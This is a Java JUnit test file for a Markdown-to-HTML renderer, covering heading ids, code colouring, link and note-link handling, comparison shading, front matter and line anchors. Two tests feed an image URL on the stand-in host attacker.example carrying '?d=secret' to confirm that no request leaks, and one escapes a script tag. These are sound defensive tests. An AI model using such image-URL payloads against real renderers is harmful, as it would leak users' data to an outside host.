package dev.marregui.comando.ui.kit.text;

import java.util.List;
import java.util.Map;
import java.util.Set;

import org.junit.jupiter.api.Test;

import dev.marregui.comando.ui.kit.theme.Theme;

import static org.assertj.core.api.Assertions.assertThat;

/// [MarkdownHtml] renders Markdown to the HTML the panes show, without fetching anything.
/// - A heading gets the id GitHub gives it, numbered on when taken.
/// - An image becomes its alt text; raw HTML images are escaped.
/// - A code block takes the editor's colours for its language, or is plain and escaped.
/// - Links stay links; web addresses and note links in text become links, but not inside a link or code.
/// - Comparison marks shade changed blocks and words.
/// - Front matter shows as a table of facts, and marks still land on the same lines.
/// - For a comparison each block, row and item says its source line and a side can leave gaps; a preview does neither.
class MarkdownHtmlTest {

    private static final String MIXED = """
            # Title

            Text.

            | a | b |
            |---|---|
            | 1 | 2 |

            - item
            - other

            ```java
            int x;
            ```
            """;

    /// Ids are lower case, drop punctuation and inline markup, keep letters of any language and `_`, turn each space
    /// into a hyphen, cover setext headings, count on as `-1`, `-1-1`, `-2` as GitHub does, restart per document, and
    /// are given by every renderer; a paragraph has none.
    @Test
    void aHeadingHasTheIdGitHubGivesIt() {
        assertThat(MarkdownHtml.render("## 3. Decisions")).contains("<h2 id=\"3-decisions\">3. Decisions</h2>");
        assertThat(MarkdownHtml.render("# The `LocalImages` class")).contains("<h1 id=\"the-localimages-class\">");
        assertThat(MarkdownHtml.render("### **Bold** _it_ [a link](x.md)")).contains("<h3 id=\"bold-it-a-link\">");
        assertThat(MarkdownHtml.render("## Café & crème: what's left?")).as("letters of any language kept, each space a hyphen")
                .contains("id=\"café--crème-whats-left\"");
        assertThat(MarkdownHtml.render("## snake_case and kebab-case")).contains("id=\"snake_case-and-kebab-case\"");
        assertThat(MarkdownHtml.render("Setext title\n============")).contains("<h1 id=\"setext-title\">");
        assertThat(MarkdownHtml.render("## A\n\n## A\n\n## A-1\n\n## A")).as("a taken id counts on, as GitHub's")
                .contains("id=\"a\"", "id=\"a-1\"", "id=\"a-1-1\"", "id=\"a-2\"");
        assertThat(MarkdownHtml.render("## Notes", null, MarkdownHtml.Pictures.NONE)).as("every renderer")
                .contains("id=\"notes\"");
        assertThat(MarkdownHtml.render("## Notes")).as("ids count from the top of each document").contains("id=\"notes\"");
        assertThat(MarkdownHtml.render("a paragraph")).doesNotContain("id=");
    }

    /// An image renders as its alt text in italics with markup stripped, and its URL appears nowhere, so no request
    /// leaks.
    @Test
    void anImageBecomesItsAltTextAndItsUrlIsNotRendered() {
        final String html = MarkdownHtml.render("Plan ![status of <b>x</b>](https://attacker.example/p.png?d=secret) done");
        assertThat(html).doesNotContain("<img").doesNotContain("attacker.example").contains("<i>status of x</i>");
    }

    /// An inline `<img>` tag is escaped, not rendered.
    @Test
    void rawHtmlImagesAreEscaped() {
        assertThat(MarkdownHtml.render("<img src=\"https://attacker.example/p.png\">")).doesNotContain("<img");
    }

    /// A Java fence renders in `pre.code` with keywords and strings in the palette's colours, its HTML escaped.
    @Test
    void aCodeBlockTakesTheEditorsColoursForItsLanguage() {
        final String html = MarkdownHtml.render("```java\nreturn \"<b>\";\n```\n");
        assertThat(html).contains("<pre class=\"code\"><code>")
                .contains("<font color=\"" + Theme.hex(Theme.content().keyword) + "\">return</font>")
                .contains("<font color=\"" + Theme.hex(Theme.content().string) + "\">\"&lt;b&gt;\"</font>")
                .doesNotContain("<b>");
    }

    /// A fence without a language is escaped and has no colour markup.
    @Test
    void aCodeBlockWithoutALanguageIsPlainAndEscaped() {
        assertThat(MarkdownHtml.render("```\n<script>x</script>\n```\n"))
                .contains("<pre class=\"code\"><code>&lt;script&gt;x&lt;/script&gt;\n</code></pre>")
                .doesNotContain("<font");
    }

    /// A Markdown link renders as an anchor with its target.
    @Test
    void linksStayLinks() {
        assertThat(MarkdownHtml.render("[docs](https://example.org/a)")).contains("href=\"https://example.org/a\">docs</a>");
    }

    /// Marked lines shade their paragraph, list item, table cells and code block in the added colour and a marked word
    /// range in the stronger one, unmarked blocks stay plain, the older side uses the removed colour, and no marks
    /// render as before.
    @Test
    void marksShadeTheChangedBlocksAndTheirChangedWordsAsAComparisonDoes() {
        final String md = "# Title\n\nFirst para.\n\nSecond para has words.\n\n- a\n- b\n\n| x | y |\n|---|---|\n| 1 | 2 |\n\n```java\nint x;\n```\n";
        final int word = md.indexOf("words");
        final MarkdownHtml.Marks marks = new MarkdownHtml.Marks(Set.of(4, 7, 11, 14), List.of(new int[] {word, word + 5}), true);
        final String html = MarkdownHtml.render(md, null, MarkdownHtml.Pictures.NONE, marks);
        final String line = "background-color: " + Theme.hex(Theme.content().added);
        final String strong = "background-color: " + Theme.hex(Theme.content().addedWord);
        assertThat(html).contains("<p style=\"" + line + "\">Second para has <span style=\"" + strong + "\">words</span>.</p>")
                .contains("<li style=\"" + line + "\">b</li>", "<li>a</li>", "<p>First para.</p>", ">Title</h1>")
                .contains("<td style=\"" + line + "\">1</td>", "<td style=\"" + line + "\">2</td>")
                .contains("<pre class=\"code\" style=\"" + line + "\">");

        final String older = MarkdownHtml.render("Gone\n", null, MarkdownHtml.Pictures.NONE, new MarkdownHtml.Marks(Set.of(0), List.of(), false));
        assertThat(older).as("the older side in red").contains("<p style=\"background-color: " + Theme.hex(Theme.content().removed) + "\">Gone</p>");
        assertThat(MarkdownHtml.render(md, null, MarkdownHtml.Pictures.NONE, MarkdownHtml.Marks.NONE))
                .as("no marks: as ever").isEqualTo(MarkdownHtml.render(md));
    }

    /// Bare URLs and `[[note]]`/`[[note#h|label]]` in text become anchors, the URL without its trailing period, and no
    /// brackets remain.
    @Test
    void webAddressesAndNoteLinksInTextAreLinks() {
        final String html = MarkdownHtml.render("See [[feedback-verification-discipline]], [[notes#setup|the setup]] and https://example.org/a.");
        assertThat(html).contains("<a href=\"comando-note:feedback-verification-discipline\">feedback-verification-discipline</a>",
                "<a href=\"comando-note:notes#setup\">the setup</a>", "href=\"https://example.org/a\">https://example.org/a</a>.");
        assertThat(html).doesNotContain("[[");
    }

    /// A URL that is a link's text, and note or URL text in inline code or a fence, are not linked.
    @Test
    void textInALinkOrCodeStaysAsWritten() {
        assertThat(MarkdownHtml.render("[https://a.b/c](https://x.y)")).contains("href=\"https://x.y\"").doesNotContain("href=\"https://a.b/c\"");
        assertThat(MarkdownHtml.render("`[[name]]` and `https://a.b`")).contains("<code>[[name]]</code>").doesNotContain("<a ");
        assertThat(MarkdownHtml.render("```\n[[name]]\n```")).doesNotContain("<a ");
    }

    /// A memory file's front matter renders as a key/value table before the body, with note links in values, instead of
    /// a rule and a setext heading.
    @Test
    void aMemoryFilesFrontMatterShowsAsItsFactsNotAHeading() {
        final String memory = """
                ---
                name: reference-video-transcripts
                description: "How to get a transcript, see [[feedback-ui-requests]]"
                metadata:
                  node_type: memory
                  type: reference
                ---

                Proven 2026-10-22.
                """;
        final String html = MarkdownHtml.render(memory);
        assertThat(html).doesNotContain("<h2", "<hr");
        assertThat(html).contains("<td class=\"front-key\" valign=\"top\">name</td><td class=\"front-value\">reference-video-transcripts</td>",
                "metadata.type", "<a href=\"comando-note:feedback-ui-requests\">feedback-ui-requests</a>", "<p>Proven 2026-10-22.</p>");
        assertThat(html.indexOf("front-key")).as("the facts come first").isLessThan(html.indexOf("Proven"));
    }

    /// A preview has no line in it, and leaves the same page whether it goes through the anchored render or not.
    @Test
    void aPreviewSaysNoLine() {
        final String preview = MarkdownHtml.render(MIXED);
        assertThat(preview).doesNotContain(MarkdownHtml.LINE);
        assertThat(anchored(MIXED, MarkdownHtml.Anchors.NONE)).isEqualTo(preview);
    }

    /// For a comparison a block at the top of the page, a table's body row, a list's item and a fenced block say the
    /// line they start on, from 0; the table's head row is the table's own line, and a fenced block keeps its class.
    @Test
    void aComparedPageSaysTheLineOfEachBlockRowAndItem() {
        assertThat(anchored(MIXED, MarkdownHtml.Anchors.gaps(Map.of()))).contains(
                "<h1 id=\"title\" data-line=\"0\">",
                "<p data-line=\"2\">Text.</p>",
                "data-line=\"4\"",
                "<tr data-line=\"6\">",
                "<li data-line=\"8\">",
                "<li data-line=\"9\">",
                "<pre class=\"code\" data-line=\"11\">");
    }

    /// A gap opens as an empty block above the block of its line, and under the last block for the end of the page.
    @Test
    void aGapOpensAboveItsBlockAndAtTheEnd() {
        final String html = anchored("One.\n\nTwo.\n",
                MarkdownHtml.Anchors.gaps(Map.of(2, 30, MarkdownHtml.Anchors.END, 12)));
        assertThat(html).containsPattern("<p data-line=\"0\">One.</p>\\s*<div style=\"height: 30pt[^\"]*\"></div>"
                + "<p data-line=\"2\">Two.</p>\\s*<div style=\"height: 12pt[^\"]*\"></div>$");
    }

    /// Among a table's rows and a list's items no block can stand, so a row's cells open the gap above their text, on
    /// top of the padding a cell has, and an item takes it as a margin.
    @Test
    void aGapAmongRowsAndItemsIsTheirOwnSpace() {
        final String html = anchored(MIXED, MarkdownHtml.Anchors.gaps(Map.of(6, 10, 9, 7)));
        assertThat(html).doesNotContain("<div style").contains("<td style=\"padding-top: 12pt\">1</td>",
                "<li data-line=\"9\" style=\"margin-top: 7pt\">");
    }

    /// A row both shaded and given a gap keeps the two: the gap does not take the shade's place.
    @Test
    void aGapKeepsTheShadeOfItsBlock() {
        final String text = "| a |\n|---|\n| 1 |\n";
        final String html = MarkdownHtml.render(text, null, MarkdownHtml.Pictures.NONE,
                new MarkdownHtml.Marks(Set.of(2), List.of(), true), MarkdownHtml.Anchors.gaps(Map.of(2, 10)));
        assertThat(html).containsPattern("<td style=\"padding-top: 12pt; background-color: [^\"]+\">1</td>");
    }

    /// A mark on a line below front matter shades that line's paragraph, so line numbers count the front matter.
    @Test
    void aComparedTextWithFrontMatterShadesTheSameLines() {
        final String text = "---\nname: x\n---\n\nfirst\n\nsecond\n";
        final String html = MarkdownHtml.render(text, null, MarkdownHtml.Pictures.NONE, new MarkdownHtml.Marks(Set.of(6), List.of(), true));
        assertThat(html).containsPattern("<p style=\"background-color: [^\"]+\">second</p>").contains("<p>first</p>");
    }

    private static String anchored(final String markdown, final MarkdownHtml.Anchors anchors) {
        return MarkdownHtml.render(markdown, null, MarkdownHtml.Pictures.NONE, MarkdownHtml.Marks.NONE, anchors);
    }
}
